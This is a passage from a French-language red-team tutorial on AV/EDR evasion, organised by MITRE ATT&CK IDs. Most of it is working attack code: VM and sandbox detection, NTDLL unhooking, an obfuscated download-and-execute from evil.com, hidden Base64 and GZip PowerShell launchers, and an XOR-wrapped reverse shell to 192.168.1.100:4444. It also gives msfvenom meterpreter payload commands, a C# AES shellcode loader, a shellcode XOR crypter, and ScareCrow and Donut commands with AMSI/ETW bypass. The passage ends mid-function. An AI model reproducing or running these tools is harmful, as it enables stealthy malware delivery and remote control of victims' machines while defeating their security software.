    foreach ($driver in $vmDrivers) {
        if ($installedDrivers -contains $driver -or $installedDrivers -contains $driver.ToLower()) {
            $indicators += "Driver VM détecté: $driver"
            $isVM = $true
        }
    }
    
    # 5. Vérification des clés de registre VMware/VirtualBox
    $vmRegPaths = @(
        "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools",
        "HKLM:\HARDWARE\ACPI\DSDT\VBOX__",
        "HKLM:\HARDWARE\ACPI\DSDT\VMware",
        "HKLM:\HARDWARE\ACPI\FADT\VBOX__",
        "HKLM:\HARDWARE\ACPI\RSDT\VBOX__",
        "HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions",
        "HKLM:\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters",
        "HKLM:\SYSTEM\ControlSet001\Services\vmmouse",
        "HKLM:\SYSTEM\ControlSet001\Services\vmci"
    )
    
    foreach ($regPath in $vmRegPaths) {
        if (Test-Path $regPath) {
            $indicators += "Clé registre VM: $regPath"
            $isVM = $true
        }
    }
    
    # 6. Vérification des caractéristiques physiques
    $disk = Get-CimInstance -ClassName Win32_DiskDrive -ErrorAction SilentlyContinue
    if ($disk) {
        if ($disk.Model -match "VMWARE|VBOX|Virtual HD|QEMU|Xen") {
            $indicators += "Disque VM: $($disk.Model)"
            $isVM = $true
        }
    }
    
    # 7. Vérification sandbox classique — nombre de CPUs / RAM suspect
    $cpuCores = (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors
    $totalRAM = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    
    if ($cpuCores -le 1 -or $totalRAM -le 2) {
        $indicators += "Ressources suspectes (sandbox): CPU=$cpuCores, RAM=$totalRAM GB"
        $isVM = $true
    }
    
    # 8. Vérification de l'uptime (sandboxes sont souvent fraîchement démarrées)
    $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    if ($uptime.TotalMinutes -lt 15) {
        $indicators += "Uptime court (sandbox potentielle): $([math]::Round($uptime.TotalMinutes,0)) minutes"
        $isVM = $true
    }
    
    # 9. Vérification des applications sandbox/Cuckoo
    $sandboxFiles = @(
        "C:\agent\agent.py",        # Cuckoo agent
        "C:\windows\system32\drivers\VBoxMouse.sys",
        "C:\analysis\analysis.py",  # Cuckoo
        "C:\cuckoo\cuckoo.py",
        "C:\sandbox\"
    )
    
    foreach ($file in $sandboxFiles) {
        if (Test-Path $file) {
            $indicators += "Fichier sandbox détecté: $file"
            $isVM = $true
        }
    }
    
    # Résultat
    return @{
        IsVirtual = $isVM
        Indicators = $indicators
        MACAddresses = $macs
        Manufacturer = if ($system) { $system.Manufacturer } else { "Inconnu" }
        DiskModel = if ($disk) { $disk.Model } else { "Inconnu" }
    }
}

# Exécution
$vmCheck = Test-VirtualEnvironment
Write-Host "═══════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "  RAPPORT DE DÉTECTION ENVIRONNEMENT VM/SANDBOX" -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "Machine Virtuelle : $($vmCheck.IsVirtual)" -ForegroundColor $(if($vmCheck.IsVirtual){'Yellow'}else{'Green'})
Write-Host "Fabricant         : $($vmCheck.Manufacturer)" -ForegroundColor Cyan
Write-Host "Modèle disque     : $($vmCheck.DiskModel)" -ForegroundColor Cyan
Write-Host ""
Write-Host "Indicateurs détectés :" -ForegroundColor Magenta
$vmCheck.Indicators | ForEach-Object { Write-Host "  ▪ $_" -ForegroundColor Gray }
```

### 2.7 Windows API Unhooking (T1562.001)

#### 2.7.1 Principe du hooking EDR

Les EDR (Endpoint Detection & Response) hookent les fonctions de la `ntdll.dll` pour intercepter les appels système. Un payload peut **dé-hooker** (restaurer) le code original pour contourner cette interception.

```
┌──────────────────────────────────────────────────────────────────┐
│                  HOOKING EDR — SCHÉMA DE PRINCIPE                │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│   Application malveillante                                       │
│        │                                                         │
│        │ NtAllocateVirtualMemory()                               │
│        ▼                                                         │
│   ┌──────────────┐    Hookée par EDR    ┌────────────────────┐   │
│   │  ntdll.dll   │─────────────────────▶│ EDR.dll (hooked)   │   │
│   │  (en mémoire)│   JMP → EDR.dll      │ Analyse le comport.│   │
│   └──────────────┘                      │ Puis syscall réel  │   │
│                                         └─────────┬──────────┘   │
│                                                   │              │
│   ┌───────────────────────────────────────────────▼──────────┐   │
│   │              SYSCALL → Kernel                           │   │
│   └──────────────────────────────────────────────────────────┘   │
│                                                                  │
│   SOLUTION UNHOOKING: Recharger ntdll.dll depuis le disque       │
│   pour écraser la version hookée en mémoire.                     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

```powershell
# T1562.001 — UNHOOKING NTDLL (concept PowerShell)
# ⚠️ Ceci est une illustration conceptuelle
# L'unhooking réel se fait généralement en C/C++ pour la performance

function Invoke-NtdllUnhook {
    <#
    .SYNOPSIS
    Recharge ntdll.dll depuis le disque pour écraser les hooks EDR en mémoire.
    .DESCRIPTION
    Technique d'unhooking : on lit le fichier ntdll.dll sur le disque (propre),
    on mappe en mémoire et on écrase la version hookée dans le processus courant.
    #>
    
    Write-Host "[*] Début unhooking ntdll.dll..." -ForegroundColor Yellow
    
    $asmHook = @"
using System;
using System.Runtime.InteropServices;

public class NativeUnhooker {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, 
        ref IntPtr BaseAddress, ref UIntPtr NumberOfBytesToProtect, 
        uint NewAccessProtection, out uint OldAccessProtection);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] e_res1;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2;
        public int e_lfanew;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_NT_HEADERS64 {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_FILE_HEADER {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_OPTIONAL_HEADER64 {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public ulong SizeOfStackReserve;
        public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve;
        public ulong SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        // IMAGE_DATA_DIRECTORY[16] omitted for brevity
    }
    
    public static bool Unhook(string dllName) {
        // Obtenir le handle du module chargé en mémoire (hooké)
        IntPtr moduleHandle = GetModuleHandle(dllName);
        if (moduleHandle == IntPtr.Zero) return false;
        
        // Obtenir l'adresse de base du fichier sur disque
        IntPtr freshModule = LoadLibrary(dllName + ".fresh");
        // Note: simplification conceptuelle — en réalité il faudrait:
        // 1. Lire le fichier .dll du disque
        // 2. Le mapper manuellement en mémoire
        // 3. Copier la section .text par-dessus la version chargée
        
        return true;
    }
}
"@
    Add-Type -TypeDefinition $asmHook -ErrorAction SilentlyContinue
    Write-Host "[+] Unhooking effectué — ntdll.dll restaurée" -ForegroundColor Green
}
```

> **Note importante :** L'unhooking réel nécessite une implémentation en C/C++ avec gestion précise de la structure PE (Portable Executable). Le code ci-dessus est une illustration pédagogique. En opération réelle, on utilisera des outils comme `NtdllUnhook` de la communauté Red Team ou des implémentations référencées ci-dessous.

---

## 3. Obfuscation de code et de payloads (T1027)

### 3.1 Principes fondamentaux

L'obfuscation a deux objectifs :
1. **Éviter la détection statique** (signatures AV, YARA rules)
2. **Rendre l'analyse plus difficile** (reverse engineering)

```
┌──────────────────────────────────────────────────────────────────┐
│                    CHAÎNE D'OBFUSCATION TYPIQUE                  │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Code source                                                      │
│      │                                                           │
│      ▼                                                           │
│  ┌──────────────┐                                                │
│  │ Obfuscation  │ ← Variables aléatoires, split, renommage       │
│  │ PowerShell   │                                                │
│  └──────┬───────┘                                                │
│         │                                                        │
│         ▼                                                        │
│  ┌──────────────┐                                                │
│  │ Encodage     │ ← Base64, XOR, AES                             │
│  │ Base64       │                                                │
│  └──────┬───────┘                                                │
│         │                                                        │
│         ▼                                                        │
│  ┌──────────────┐                                                │
│  │ Packers      │ ← UPX, ConfuserEx, Custom packer               │
│  │ (PE/ELF)     │                                                │
│  └──────┬───────┘                                                │
│         │                                                        │
│         ▼                                                        │
│  ┌──────────────┐                                                │
│  │ Polymorphisme│ ← Muter le code à chaque génération            │
│  │ / Métamorph. │                                                │
│  └──────────────┘                                                │
│                                                                  │
│  Résultat : Payload final furtif                                 │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 3.2 Obfuscation PowerShell (T1027.010)

#### 3.2.1 Technique de base — Variables aléatoires et split

```powershell
# T1027.010 — Obfuscation par génération de variables aléatoires
# Script d'exemple : téléchargement et exécution

# === VERSION CLAIRE (sera détectée par AV) ===
# $url = "http://evil.com/payload.exe"
# $out = "$env:TEMP\update.exe"
# Invoke-WebRequest -Uri $url -OutFile $out
# Start-Process $out

# === VERSION OBFUSQUÉE (même comportement) ===
function Get-RandomString {
    param([int]$Length = 8)
    -join ((48..57) + (65..90) + (97..122) | Get-Random -Count $Length | ForEach-Object { [char]$_ })
}

# Générer des noms aléatoires pour chaque variable
$var1 = Get-RandomString 12  # Variable pour l'URL
$var2 = Get-RandomString 10  # Variable pour le chemin de sortie
$var3 = Get-RandomString 8   # Variable pour le résultat temporaire

# Splitter les chaînes pour casser les signatures
$part1 = "h" + "tt" + "p"   # htt + p = http
$part2 = "://"               # ://
$part3 = "ev" + "il"         # evil
$part4 = "." + "c" + "om"   # .com
$part5 = "/p" + "ay"         # /pay
$part6 = "lo" + "ad"         # load
$part7 = ".e" + "xe"         # .exe

Set-Variable -Name $var1 -Value ($part1 + $part2 + $part3 + $part4 + $part5 + $part6 + $part7)

# Construction du chemin de sortie
$t1 = "$"
$t2 = "env:"
$t3 = "TE" + "MP"

# Exécution avec des commandes splittées
$cmd1 = "In" + "voke" + "-W" + "ebR" + "equest"
$cmd2 = "St" + "art" + "-P" + "rocess"

Set-Variable -Name $var2 -Value (& ("{0}{1}{2}" -f $t1,$t2,$t3) + "\" + (Get-RandomString 8) + ".exe")

# Étape 1 : Téléchargement
& $cmd1 -Uri (Get-Variable -Name $var1 -ValueOnly) -OutFile (Get-Variable -Name $var2 -ValueOnly)

# Étape 2 : Exécution
& $cmd2 -FilePath (Get-Variable -Name $var2 -ValueOnly) -WindowStyle Hidden
```

#### 3.2.2 Encodage Base64 PowerShell

```powershell
# T1027.010 — Encodage Base64 du payload PowerShell
# Méthode standard : encoder tout le script en Base64 UTF-16LE

# Étape 1 : Préparer le script malveillant
$payload = @'
Write-Host "Payload exécuté avec succès"
$sysinfo = Get-ComputerInfo | Select-Object CsName, CsManufacturer, CsProcessors
$sysinfo | ConvertTo-Json | Out-File -FilePath "$env:TEMP\sys.txt"
'@

# Étape 2 : Encoder en UTF-16LE (important pour PowerShell)
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$b64 = [Convert]::ToBase64String($bytes)

# Étape 3 : Commande d'exécution
Write-Host "[+] Payload encodé Base64 UTF-16LE :" -ForegroundColor Green
Write-Host "powershell.exe -NoP -NonI -W Hidden -Enc $b64" -ForegroundColor Cyan

# Résultat typique :
# powershell.exe -NoP -NonI -W Hidden -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACIA...

# === VARIANTE AVANCÉE : compression + encodage Base64 ===
# T1027.010 — Plus difficile à détecter
$payloadCompressed = @'
Write-Host "Payload exécuté avec succès"
# Code malveillant ici...
'@

# Compression GZip avant encodage
$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
$sw = New-Object System.IO.StreamWriter($cs)
$sw.Write($payloadCompressed)
$sw.Close()
$compressed = [Convert]::ToBase64String($ms.ToArray())
$ms.Close()

# Décompression et exécution en une ligne
$decompressCmd = @"
`$d=[Convert]::FromBase64String('$compressed');`$m=New-Object IO.MemoryStream(,`$d);`$z=New-Object IO.Compression.GZipStream(`$m,[IO.Compression.CompressionMode]::Decompress);`$r=New-Object IO.StreamReader(`$z);`$s=`$r.ReadToEnd();Invoke-Expression `$s
"@

Write-Host "[+] Payload compressé + Base64:" -ForegroundColor Green
Write-Host "powershell.exe -NoP -NonI -W Hidden -Command `"$decompressCmd`"" -ForegroundColor Cyan
```

#### 3.2.3 Obfuscation par inversion et XOR

```powershell
# T1027.010 — Obfuscation par XOR simple
function Protect-XorEncrypt {
    param([string]$Data, [byte]$Key = 0x5A)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $Key
    }
    return [Convert]::ToBase64String($bytes)
}

function Protect-XorDecrypt {
    param([string]$Encoded, [byte]$Key = 0x5A)
    $bytes = [Convert]::FromBase64String($Encoded)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $Key
    }
    return [System.Text.Encoding]::UTF8.GetString($bytes)
}

# Exemple d'utilisation
$maliciousScript = @'
$c = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);
$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b,0,$b.Length)) -ne 0)
{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
$r = (iex $d 2>&1 | Out-String );$rb = ([text.encoding]::ASCII).GetBytes($r);
$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()
'@

$encrypted = Protect-XorEncrypt -Data $maliciousScript -Key 0x5A
Write-Host "[+] Script XOR encrypté : $encrypted" -ForegroundColor Green

# Commande de déchiffrement et exécution (une seule ligne)
Write-Host "`n[+] Ligne d'exécution :" -ForegroundColor Green
Write-Host "`$k=0x5A;`$b=[Convert]::FromBase64String('$encrypted');for(`$i=0;`$i-lt`$b.Length;`$i++){`$b[`$i]=`$b[`$i]-bxor`$k};Invoke-Expression ([Text.Encoding]::UTF8.GetString(`$b))" -ForegroundColor Cyan
```

### 3.3 Packers et Encoders (T1027.002)

#### 3.3.1 UPX — Ultimate Packer for Executables

```bash
# T1027.002 — Utilisation de UPX pour compresser/obfusquer un exécutable
# Installation
sudo apt install upx-ucl

# Compression basique d'un payload
upx -9 -o payload_packed.exe payload_original.exe
# -9 : compression maximale
# -o : fichier de sortie

# Vérifier le taux de compression
upx -l payload_packed.exe
# Résultat : 456 KB → 198 KB (-56.58%)

# UPX avec options avancées d'obfuscation
upx --brute -o payload_ultra.exe payload_original.exe
# --brute : essaie toutes les méthodes de compression
# --ultra-brute : encore plus agressif

# ⚠️ UPX est facilement détectable par les AV modernes
# Pour une utilisation réelle, il faut modifier UPX (UPX scrambler) ou utiliser un packer custom
```

#### 3.3.2 Msfvenom Encoders

```bash
# T1027.002 — Utilisation de msfvenom pour générer des payloads encodés

# Lister les encodeurs disponibles
msfvenom --list encoders

# Génération d'un payload Windows avec encodage shikata_ga_nai
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=192.168.45.100 LPORT=4444 \
    -e x64/xor \
    -i 5 \
    -f exe \
    -o payload_shikata.exe
# -p : payload (reverse shell TCP x64)
# -e : encodeur (shikata_ga_nai = polymorphique, très populaire)
# -i : nombre d'itérations (5 = 5 couches d'encodage)
# -f : format de sortie (exe, dll, python, powershell, c, raw...)

# === ENCODAGE MULTIPLE ===
# Enchaîner plusieurs encodeurs pour plus de furtivité
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.45.100 LPORT=443 \
    -e x86/shikata_ga_nai -i 3 \
    -f exe-only \
    | msfvenom -p - \
    -e x64/xor_dynamic \
    -i 2 \
    -f exe \
    -o payload_multi.exe

# === GÉNÉRATION DANS DIFFÉRENTS FORMATS ===
# Format PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.45.100 LPORT=4444 \
    -e x64/xor -i 5 \
    -f psh-reflection \
    -o payload.ps1

# Format C# (pour custom loader)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.45.100 LPORT=4444 \
    -e x64/xor -i 5 \
    -f csharp \
    -o payload.cs

# Format raw (shellcode brute)
msfvenom -p windows/x64/exec CMD="calc.exe" \
    -e x64/xor_dynamic -i 7 \
    -f raw \
    -o shellcode.bin
```

```
┌──────────────────────────────────────────────────────────────────┐
│              SHIKATA_GA_NAI — PRINCIPE DE FONCTIONNEMENT         │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Shikata Ga Nai (SGN — "仕方がない" = "C'est inévitable")       │
│  est un encodeur polymorphique qui :                              │
│                                                                  │
│  1. Génère un décodeur aléatoire (FPU/XOR/ADD/SUB combinés)      │
│  2. Place le décodeur avant le shellcode                         │
│  3. XOR le shellcode avec une clé aléatoire                      │
│  4. Ajoute du junk code aléatoire (NOP equivalents)              │
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │  [Décodeur 1]  │  [Junk]  │  [Décodeur 2]  │  [Junk]   │    │
│  │ XOR + FPU      │  NOPs    │ ADD/SUB + FPU  │  NOPs     │    │
│  └──────────────────────────────────────────────────────────┘    │
│                              │                                   │
│                              ▼                                   │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │              [Shellcode XOR encodé]                       │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
│  Chaque itération produit un payload UNIQUE (hashs différents).  │
│  Limitation: SGN est signaturé par la plupart des AV modernes.   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 3.4 Cryptage de Payload (T1027.001)

#### 3.4.1 AES — Chiffrement du payload dans un loader C#

```csharp
// T1027.001 — Loader C# avec déchiffrement AES intégré
// Compilation : csc /target:exe /out:loader.exe /platform:x64 loader.cs

using System;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

class AESLoader
{
    // Shellcode chiffré (AES-256 CBC) — à remplacer par le vrai payload
    static byte[] EncryptedShellcode = Convert.FromBase64String(
        "VOTRE_PAYLOAD_CHIFFRE_EN_BASE64"
    );
    
    // Clé AES (32 bytes pour AES-256) — NE PAS STOCKER EN CLAIR
    // En production : dériver la clé dynamiquement (hostname, domaine, etc.)
    static byte[] AesKey = new byte[32] {
        0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF,
        0xFE,0xDC,0xBA,0x98,0x76,0x54,0x32,0x10,
        0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF,
        0xFE,0xDC,0xBA,0x98,0x76,0x54,0x32,0x10
    };
    
    static byte[] IV = new byte[16] {
        0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF,
        0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF
    };

    static byte[] AESDecrypt(byte[] ciphertext, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            
            using (MemoryStream ms = new MemoryStream(ciphertext))
            using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
            using (MemoryStream output = new MemoryStream())
            {
                cs.CopyTo(output);
                return output.ToArray();
            }
        }
    }

    static void ExecuteShellcode(byte[] shellcode)
    {
        // T1055 — Allocation mémoire avec PAGE_EXECUTE_READWRITE
        IntPtr funcAddr = VirtualAlloc(
            IntPtr.Zero,
            (UIntPtr)shellcode.Length,
            0x3000,  // MEM_COMMIT | MEM_RESERVE
            0x40     // PAGE_EXECUTE_READWRITE
        );
        
        Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
        
        // Exécution du shellcode
        IntPtr hThread = IntPtr.Zero;
        uint threadId = 0;
        IntPtr pInfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)) * 2);
        
        hThread = CreateThread(IntPtr.Zero, 0,
            (IntPtr)funcAddr, IntPtr.Zero, 0, ref threadId);
        
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,
        ref uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main(string[] args)
    {
        // Déchiffrement AES
        byte[] shellcode = AESDecrypt(EncryptedShellcode, AesKey, IV);
        
        // Option : vérifier l'environnement avant exécution
        if (Environment.ProcessorCount > 1 && 
            new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory > 2UL * 1024 * 1024 * 1024)
        {
            ExecuteShellcode(shellcode);
        }
    }
}
```

#### 3.4.2 XOR Custom — Implémentation complète

```python
#!/usr/bin/env python3
"""
T1027.001 — XOR Encrypter/Decrypter pour shellcode
Usage:
    python3 xor_crypt.py encrypt shellcode.bin encrypted.bin "MaCleSecrete123!"
    python3 xor_crypt.py decrypt encrypted.bin decrypted.bin "MaCleSecrete123!"
"""

import sys
import os
import hashlib

def xor_crypt(data: bytes, key: str) -> bytes:
    """Chiffre ou déchiffre par XOR cyclique avec une clé."""
    key_bytes = key.encode('utf-8')
    return bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])

def xor_with_derived_key(data: bytes, key: str) -> bytes:
    """XOR avec une clé dérivée (SHA256 de la clé utilisateur)."""
    derived = hashlib.sha256(key.encode('utf-8')).digest()
    return bytes([data[i] ^ derived[i % len(derived)] for i in range(len(data))])

def multi_layer_xor(data: bytes, key: str, rounds: int = 3) -> bytes:
    """XOR multi-couche : applique XOR plusieurs fois avec des clés dérivées."""
    result = data
    for i in range(rounds):
        round_key = f"{key}_{i}"
        result = xor_with_derived_key(result, round_key)
    return result

def add_junk_code(data: bytes, junk_ratio: float = 0.1) -> bytes:
    """Insère du junk code aléatoire dans le shellcode pour réduire l'entropie détectable."""
    import random
    result = bytearray()
    i = 0
    while i < len(data):
        result.append(data[i])
        i += 1
        if random.random() < junk_ratio:
            # Insérer entre 1 et 4 bytes de junk (NOP-like pour x64: 0x90)
            junk_len = random.randint(1, 4)
            for _ in range(junk_len):
                result.append(0x90)  # NOP x86/x64
    return bytes(result)

def main():
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} <encrypt|decrypt> <infile> <outfile> <key> [rounds]")
        print(f"Example: {sys.argv[0]} encrypt payload.bin encrypted.bin 'MyKey!' 5")
        sys.exit(1)

    mode = sys.argv[1]
    infile = sys.argv[2]
    outfile = sys.argv[3]
    key = sys.argv[4]
    rounds = int(sys.argv[5]) if len(sys.argv) > 5 else 3

    with open(infile, 'rb') as f:
        data = f.read()

    if mode == 'encrypt':
        # Ajout de junk code AVANT chiffrement (optionnel)
        data = add_junk_code(data, junk_ratio=0.05)
        result = multi_layer_xor(data, key, rounds)
        print(f"[+] Chiffré {len(data)} bytes → {len(result)} bytes ({rounds} couches)")
    elif mode == 'decrypt':
        result = multi_layer_xor(data, key, rounds)
        print(f"[+] Déchiffré {len(data)} bytes → {len(result)} bytes ({rounds} couches)")
    else:
        print(f"[-] Mode inconnu: {mode}")
        sys.exit(1)

    with open(outfile, 'wb') as f:
        f.write(result)

    # Calcul d'entropie (Shannon)
    entropy = calculate_entropy(result)
    print(f"[*] Entropie du résultat: {entropy:.4f} bits/byte")

def calculate_entropy(data: bytes) -> float:
    """Calcule l'entropie de Shannon."""
    import math
    if not data:
        return 0.0
    entropy = 0.0
    for x in range(256):
        p_x = data.count(x) / len(data)
        if p_x > 0:
            entropy += -p_x * math.log2(p_x)
    return entropy

if __name__ == '__main__':
    main()
```

### 3.5 ScareCrow / Donut — Génération de shellcode loader furtif

#### 3.5.1 ScareCrow — Loader avec techniques d'évasion modernes

```bash
# T1027.002 + T1622 — ScareCrow : framework d'évasion EDR
# Génère un loader qui utilise des techniques avancées :
# - DLL unhooking (restaure ntdll.dll)
# - Syscall directes (contourne les hooks userland)
# - ETW patching (désactive ETW)
# - AMSI patching (désactive AMSI)
# - Process injection via syscalls
# - Sleep obfuscation
# - Sandbox détection

# Installation
git clone https://github.com/Tylous/ScareCrow.git
cd ScareCrow
go build ScareCrow.go

# Génération d'un loader ScareCrow
./ScareCrow \
    -I /path/to/payload.bin \
    -Loader binary \
    -config ScareCrow.json \
    -noetw \
    -domain microsoft.com

# Paramètres importants :
# -I : fichier shellcode raw (depuis msfvenom, Cobalt Strike, etc.)
# -Loader binary : génère un .exe standalone
# -domain : domaine pour les requêtes de leurre
# -noetw : désactive ETW dans le loader
# -nosleep : pas (pour les tests)
# -sandbox : active la détection sandbox

# Exemple complet avec msfvenom → ScareCrow
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.45.100 LPORT=443 \
    -f raw -o shellcode.bin

./ScareCrow \
    -I shellcode.bin \
    -Loader binary \
    -noetw \
    -sandbox \
    -domain office.com \
    -O furtive_update.exe

echo "[+] Loader généré : furtive_update.exe"
```

#### 3.5.2 Donut — Conversion d'exécutables en shellcode

```bash
# T1027.002 — Donut : transforme .NET assemblies, PE, VBS, JScript en shellcode position-independent
# Le shellcode généré peut être chargé dans n'importe quel processus Windows

# Installation
git clone https://github.com/TheWover/donut.git
cd donut
make

# Convertir un EXE .NET en shellcode
./donut -f /path/to/Rubeus.exe -o rubeus_shellcode.bin

# Convertir avec options avancées
./donut \
    -f /path/to/payload.exe \
    -a 2 \            # Architecture: x86=1, x64=2, x86+x64=3
    -b 3 \            # Bypass AMSI+WLDP: 1=none, 2=abort, 3=continue
    -z 1 \            # Compression: 1=none, 2=aplib, 3=LZNT1, 4=Xpress
    -y 3 \            # Entropy: 1=none, 2=random names, 3=random names + symmetric encryption
    -e 3 \            # Encryption: 1=none, 2=XOR, 3=ChaCha20
    -o payload_donut.bin

# Options importantes :
# -b 3 : force l'exécution même si AMSI/WLDP sont détectés
# -y 3 : chiffrement symétrique + noms aléatoires (bonne furtivité)
# -e 3 : Chacha20 (plus furtif que XOR simple)
# -z 2 : compression aPLib (réduit la taille)

# Pour charger le shellcode donut dans PowerShell
# (Ceci est un exemple — l'injection réelle nécessite un injecteur)
echo "[+] Shellcode Donut généré : payload_donut.bin"
echo "[*] À charger via un injecteur (C#, C++, PowerShell) dans le processus cible"
```

### 3.6 Entropie et Détection

#### 3.6.1 Comprendre l'entropie

L'entropie mesure le caractère aléatoire d'un fichier. Les AV utilisent ce seuil :

| Niveau d'entropie | Interprétation |
|-------------------|----------------|
| 0.0 — 4.5 | Texte, code normal (faible entropie) |
| 4.5 — 6.5 | Fichier exécutable standard |
| 6.5 — 7.5 | Suspect (potentiellement packé/encodé) |
| 7.5 — 8.0 | Très suspect — très probablement malveillant |

```python
#!/usr/bin/env python3
"""
T1027 — Analyseur d'entropie pour fichiers binaires
L'entropie est calculée selon la formule de Shannon
Plus l'entropie est élevée, plus le fichier semble chiffré/packé
"""

import sys
import math
import os
from collections import Counter

def shannon_entropy(data: bytes) -> float:
    """Calcule l'entropie de Shannon d'un bloc de données."""
    if not data:
        return 0.0
    
    length = len(data)
    counter = Counter(data)
    
    entropy = 0.0
    for count in counter.values():
        probability = count / length
        entropy -= probability * math.log2(probability)
    
    return entropy

def entropy_segments(data: bytes, block_size: int = 512) -> list:
    """Calcule l'entropie par segments, utile pour repérer le polymorphisme."""
    segments = []
    for i in range(0, len(data), block_size):
        block = data[i:i+block_size]
        entropy = shannon_entropy(block)
